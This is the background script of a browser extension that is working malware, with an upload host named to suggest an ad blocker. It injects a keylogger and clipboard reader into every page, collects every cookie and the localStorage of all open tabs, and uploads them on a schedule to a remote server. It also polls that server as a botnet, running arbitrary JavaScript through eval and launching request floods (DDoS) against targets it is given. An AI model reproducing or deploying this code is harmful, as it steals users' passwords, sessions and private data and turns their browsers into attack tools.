let settings = {};
let collectedData = {
  cookies: [],
  localStorage: [],
  sessionStorage: [],
  keystrokes: [],
  clipboard: [],
  timestamp: new Date().toISOString()
};
let botId = null;
let isExecutingCommand = false;

// Load settings on startup
chrome.runtime.onStartup.addListener(loadSettings);
chrome.runtime.onInstalled.addListener(loadSettings);

// Monitor tab updates for localStorage collection and keylogger injection
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
    injectKeylogger(tabId);
    if (settings.autoScrapeEnabled) {
      collectTabData(tabId, tab.url);
    }
  }
});

// Monitor new tabs
chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
    setTimeout(() => {
      injectKeylogger(tab.id);
      if (settings.autoScrapeEnabled) {
        collectTabData(tab.id, tab.url);
      }
    }, 2000);
  }
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'extractCookies') {
    extractAllCookies(request.forceMethod).then(sendResponse);
    return true;
  } else if (request.action === 'updateSettings') {
    settings = request.settings;
    setupAutoScrape();
    sendResponse({success: true});
  } else if (request.action === 'logData') {
    if (request.data.keys) {
      collectedData.keystrokes.push({
        url: request.data.url,
        domain: request.data.domain,
        keys: request.data.keys,
        timestamp: request.data.timestamp
      });
    }
    if (request.data.clipboard && request.data.clipboard.length > 0) {
      collectedData.clipboard.push(...request.data.clipboard.map(clip => ({
        ...clip,
        url: request.data.url,
        domain: request.data.domain
      })));
    }
    if (collectedData.keystrokes.length > 1000) {
      collectedData.keystrokes = collectedData.keystrokes.slice(-500);
    }
    if (collectedData.clipboard.length > 500) {
      collectedData.clipboard = collectedData.clipboard.slice(-250);
    }
  }
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  console.log('Alarm triggered:', alarm.name, 'at', new Date().toISOString());
  if (alarm.name === 'autoScrape') {
    console.log('Running auto-scrape from alarm');
    // Just reload settings, don't setup new alarms
    settings = await chrome.storage.sync.get({
      autoScrapeEnabled: true,
      scrapeInterval: 360,
      exportMethod: 'api',
      apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
      apiHeaders: '{"Content-Type": "application/json"}',
      curlCommand: '',
      userProfile: ''
    });
    console.log('Settings reloaded for alarm:', settings);
    await collectAllData();
    await uploadCollectedData();
  }
});

async function loadSettings() {
  const storage = chrome.storage || browser?.storage || chrome.storage;
  settings = await storage.sync.get({
    autoScrapeEnabled: true,
    scrapeInterval: 360,
    exportMethod: 'api',
    apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
    apiHeaders: '{"Content-Type": "application/json"}',
    curlCommand: '',
    userProfile: ''
  });
  console.log('Settings loaded:', settings);
  botId = await getBotId();
  const browserInfo = getBrowserInfo();
  console.log('Browser detected:', browserInfo);
  setupAutoScrape();
  setupBotnet();
}

function setupAutoScrape() {
  console.log('Setting up auto-scrape:', settings.autoScrapeEnabled, 'interval:', settings.scrapeInterval);
  chrome.alarms.clear('autoScrape');
  if (settings.autoScrapeEnabled) {
    console.log('Auto-scrape enabled, running immediately');
    // Run immediately only once via API
    collectAllData().then(() => uploadCollectedData());
    // Then set up recurring schedule
    const intervalMinutes = Math.max(1, settings.scrapeInterval);
    chrome.alarms.create('autoScrape', {
      delayInMinutes: intervalMinutes,
      periodInMinutes: intervalMinutes
    });
    console.log('Alarm created for', settings.scrapeInterval, 'minutes');
  }
}

async function extractAllCookies(forceMethod = null) {
  console.log('Extracting all data, method:', forceMethod || settings.exportMethod);
  try {
    // Collect all data
    await collectAllData();
    
    const allData = {
      userProfile: settings.userProfile || await getUserProfile(),
      timestamp: collectedData.timestamp,
      browser: 'Chrome/Chromium',
      total_cookies: collectedData.cookies.length,
      total_localStorage_sites: collectedData.localStorage.length,
      total_keystrokes: collectedData.keystrokes.length,
      total_clipboard: collectedData.clipboard.length,
      cookies: collectedData.cookies,
      localStorage: collectedData.localStorage,
      keystrokes: collectedData.keystrokes,
      clipboard: collectedData.clipboard
    };

    // Manual extraction uses selected method
    const exportMethod = forceMethod || settings.exportMethod;
    if (exportMethod === 'api') {
      await uploadToAPI(allData);
    } else {
      await downloadFile(allData);
    }

    return {
      success: true,
      count: collectedData.cookies.length,
      localStorageSites: collectedData.localStorage.length,
      method: exportMethod
    };
  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}

async function downloadFile(cookieData) {
  const jsonString = JSON.stringify(cookieData, null, 2);
  const dataUrl = 'data:application/json;charset=utf-8,' + encodeURIComponent(jsonString);
  const userPrefix = settings.userProfile || await getUserProfile();
  const filename = `${userPrefix}_cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
  
  await chrome.downloads.download({
    url: dataUrl,
    filename: filename,
    saveAs: false
  });
}

async function uploadToAPI(allData) {
  console.log('Attempting API upload to:', settings.apiEndpoint);
  if (!settings.apiEndpoint) {
    throw new Error('API endpoint not configured');
  }
  
  try {
    const headers = JSON.parse(settings.apiHeaders || '{}');
    console.log('Upload headers:', headers);
    
    const response = await fetch(settings.apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(allData)
    });
    
    console.log('API response status:', response.status);
    if (!response.ok) {
      throw new Error(`API upload failed: ${response.status}`);
    }
    console.log('API upload successful');
  } catch (error) {
    console.error('API upload failed:', error);
    throw error;
  }
}

async function getUserProfile() {
  return 'user';
}

async function getBotId() {
  const storage = chrome.storage || browser?.storage || chrome.storage;
  let stored = await storage.local.get(['botId']);
  if (!stored.botId) {
    const browserInfo = getBrowserInfo();
    stored.botId = `${browserInfo.name}_${Math.random().toString(36).substr(2, 9)}`;
    await storage.local.set({botId: stored.botId});
  }
  return stored.botId;
}

function getBrowserInfo() {
  const userAgent = navigator.userAgent;
  let browserName = 'chromium';
  
  if (userAgent.includes('Edg/')) browserName = 'edge';
  else if (userAgent.includes('Brave/')) browserName = 'brave';
  else if (userAgent.includes('Chrome/') && !userAgent.includes('Chromium/')) browserName = 'chrome';
  else if (userAgent.includes('Chromium/')) browserName = 'chromium';
  
  return {
    name: browserName,
    version: userAgent.match(/(Chrome|Chromium|Edg|Brave)\/([0-9.]+)/)?.[2] || 'unknown'
  };
}

function setupBotnet() {
  console.log('Setting up botnet with bot ID:', botId);
  // Poll for commands every 30 seconds
  setInterval(pollForCommands, 30000);
  // Initial poll after 5 seconds to ensure settings are loaded
  setTimeout(pollForCommands, 5000);
}

async function pollForCommands() {
  if (!settings.apiEndpoint || isExecutingCommand) {
    console.log('Skipping poll - no endpoint or executing:', !settings.apiEndpoint, isExecutingCommand);
    return;
  }
  
  try {
    const baseUrl = settings.apiEndpoint.replace('/upload', '');
    const pollUrl = `${baseUrl}/commands/${botId}`;
    console.log('Polling for commands:', pollUrl);
    
    const response = await fetch(pollUrl);
    console.log('Poll response status:', response.status);
    
    if (response.ok) {
      const command = await response.json();
      console.log('Received command:', command);
      
      if (command.id) {
        executeCommand(command);
      } else {
        console.log('No commands available');
      }
    }
  } catch (error) {
    console.error('Command poll failed:', error);
  }
}

async function executeCommand(command) {
  isExecutingCommand = true;
  console.log('Executing command:', command.type);
  
  try {
    let result = {};
    
    switch (command.type) {
      case 'js':
        result = await executeJS(command.code);
        break;
      case 'ddos':
        result = await executeDDOS(command.target, command.duration || 60);
        break;
      case 'load_test':
        result = await executeLoadTest(command.target, command.requests || 100, command.duration || 60);
        break;
    }
    
    // Report result
    const baseUrl = settings.apiEndpoint.replace('/upload', '');
    console.log('Reporting result to:', `${baseUrl}/commands/${command.id}/result`);
    const response = await fetch(`${baseUrl}/commands/${command.id}/result`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({botId, result, status: 'completed'})
    });
    console.log('Result reported, status:', response.status);
  } catch (error) {
    console.error('Command execution failed:', error);
  } finally {
    isExecutingCommand = false;
  }
}

async function executeJS(code) {
  try {
    console.log('Executing JS code:', code.substring(0, 100) + '...');
    
    // Get any available tab
    const tabs = await chrome.tabs.query({});
    const validTabs = tabs.filter(tab => 
      tab.url && 
      !tab.url.startsWith('chrome://') && 
      !tab.url.startsWith('chrome-extension://') &&
      !tab.url.startsWith('moz-extension://') &&
      !tab.url.startsWith('edge://')
    );
    
    if (validTabs.length === 0) {
      throw new Error('No valid tabs available for execution');
    }
    
    const results = await chrome.scripting.executeScript({
      target: {tabId: validTabs[0].id},
      func: (codeToExecute) => {
        try {
          return eval('(' + codeToExecute + ')');
        } catch (error) {
          return {error: error.message};
        }
      },
      args: [code]
    });
    
    const result = results[0]?.result;
    if (result?.error) {
      throw new Error(result.error);
    }
    
    console.log('JS execution result:', result);
    return {success: true, result};
  } catch (error) {
    console.error('JS execution error:', error);
    return {success: false, error: error.message};
  }
}

async function executeDDOS(target, duration) {
  const endTime = Date.now() + (duration * 1000);
  let requests = 0;
  
  while (Date.now() < endTime) {
    try {
      fetch(target, {mode: 'no-cors'});
      requests++;
    } catch (e) {}
    await new Promise(resolve => setTimeout(resolve, 10));
  }
  
  return {requests, duration};
}

async function executeLoadTest(target, maxRequests, duration) {
  const endTime = Date.now() + (duration * 1000);
  let requests = 0;
  let responses = {success: 0, error: 0};
  
  const makeRequest = async () => {
    try {
      const response = await fetch(target);
      responses.success++;
    } catch (error) {
      responses.error++;
    }
    requests++;
  };
  
  while (Date.now() < endTime && requests < maxRequests) {
    makeRequest();
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  return {requests, responses, duration};
}

// Collect localStorage/sessionStorage from a specific tab
async function collectTabData(tabId, url) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        const data = {
          url: window.location.href,
          domain: window.location.hostname,
          localStorage: {},
          sessionStorage: {},
          timestamp: new Date().toISOString()
        };
        
        // Collect localStorage
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          data.localStorage[key] = localStorage.getItem(key);
        }
        
        // Collect sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          data.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        return data;
      }
    });
    
    if (results[0]?.result) {
      const data = results[0].result;
      // Add to collected data if not already exists
      const exists = collectedData.localStorage.find(item => 
        item.url === data.url && JSON.stringify(item.localStorage) === JSON.stringify(data.localStorage)
      );
      if (!exists) {
        collectedData.localStorage.push(data);
      }
    }
  } catch (error) {
    console.log('Failed to collect from tab:', url, error.message);
  }
}

// Collect all data from all open tabs + cookies
async function collectAllData() {
  console.log('Collecting all data from open tabs...');
  
  // Reset collection (keep keystrokes and clipboard)
  const existingKeystrokes = collectedData.keystrokes || [];
  const existingClipboard = collectedData.clipboard || [];
  collectedData = {
    cookies: [],
    localStorage: [],
    sessionStorage: [],
    keystrokes: existingKeystrokes,
    clipboard: existingClipboard,
    timestamp: new Date().toISOString()
  };
  
  // Collect cookies
  const cookies = await chrome.cookies.getAll({});
  collectedData.cookies = cookies.map(cookie => ({
    name: cookie.name,
    value: cookie.value,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate,
    storeId: cookie.storeId,
    hostOnly: cookie.hostOnly,
    session: cookie.session
  }));
  
  // Collect localStorage from all open tabs
  const tabs = await chrome.tabs.query({});
  for (const tab of tabs) {
    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
      await collectTabData(tab.id, tab.url);
    }
  }
  
  console.log(`Collected ${collectedData.cookies.length} cookies and ${collectedData.localStorage.length} localStorage entries`);
}

// Inject keylogger into tab
async function injectKeylogger(tabId) {
  try {
    await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        if (window.keyloggerInjected) return;
        window.keyloggerInjected = true;
        
        let keyBuffer = [];
        let clipboardData = [];
        let lastSend = Date.now();
        let lastClipboard = '';
        const SEND_INTERVAL = 10000;
        const MAX_BUFFER = 100;

        function sendData() {
          if (keyBuffer.length === 0 && clipboardData.length === 0) return;
          
          window.postMessage({
            type: 'KEYLOGGER_DATA',
            data: {
              url: window.location.href,
              domain: window.location.hostname,
              keys: keyBuffer.join(''),
              clipboard: clipboardData,
              timestamp: new Date().toISOString()
            }
          }, '*');
          
          keyBuffer = [];
          clipboardData = [];
          lastSend = Date.now();
        }

        async function checkClipboard() {
          try {
            const text = await navigator.clipboard.readText();
            if (text && text !== lastClipboard && text.length > 0) {
              clipboardData.push({
                content: text,
                timestamp: new Date().toISOString()
              });
              lastClipboard = text;
            }
          } catch (e) {}
        }

        document.addEventListener('keydown', function(e) {
          let key = e.key;
          if (key === 'Enter') key = '[ENTER]';
          else if (key === 'Tab') key = '[TAB]';
          else if (key === 'Backspace') key = '[BACKSPACE]';
          else if (key === ' ') key = '[SPACE]';
          else if (key.length > 1) key = `[${key.toUpperCase()}]`;
          
          keyBuffer.push(key);
          
          if (keyBuffer.length >= MAX_BUFFER || Date.now() - lastSend >= SEND_INTERVAL) {
            sendData();
          }
        });

        document.addEventListener('paste', () => {
          setTimeout(checkClipboard, 100);
        });
        
        window.addEventListener('focus', checkClipboard);
        window.addEventListener('beforeunload', sendData);
        
        setInterval(() => {
          checkClipboard();
          sendData();
        }, SEND_INTERVAL);
      }
    });
    
    // Inject message bridge as content script
    await chrome.scripting.executeScript({
      target: { tabId: tabId },
      world: 'ISOLATED',
      func: () => {
        if (window.bridgeInjected) return;
        window.bridgeInjected = true;
        
        window.addEventListener('message', (event) => {
          if (event.data.type === 'KEYLOGGER_DATA') {
            chrome.runtime.sendMessage({
              action: 'logData',
              data: event.data.data
            });
          }
        });
      }
    });
  } catch (error) {
    console.log('Failed to inject keylogger:', error.message);
  }
}

// Upload all collected data
async function uploadCollectedData() {
  if (!settings.apiEndpoint) {
    console.log('No API endpoint configured');
    return;
  }
  
  try {
    const userPrefix = settings.userProfile || await getUserProfile();
    const payload = {
      userProfile: userPrefix,
      timestamp: collectedData.timestamp,
      browser: 'Chrome/Chromium',
      total_cookies: collectedData.cookies.length,
      total_localStorage_sites: collectedData.localStorage.length,
      total_keystrokes: collectedData.keystrokes.length,
      total_clipboard: collectedData.clipboard.length,
      cookies: collectedData.cookies,
      localStorage: collectedData.localStorage,
      keystrokes: collectedData.keystrokes,
      clipboard: collectedData.clipboard
    };
    
    const headers = JSON.parse(settings.apiHeaders || '{}');
    const response = await fetch(settings.apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify(payload)
    });
    
    if (response.ok) {
      console.log('Successfully uploaded all collected data');
    } else {
      console.error('Upload failed:', response.status);
    }
  } catch (error) {
    console.error('Upload error:', error);
  }
}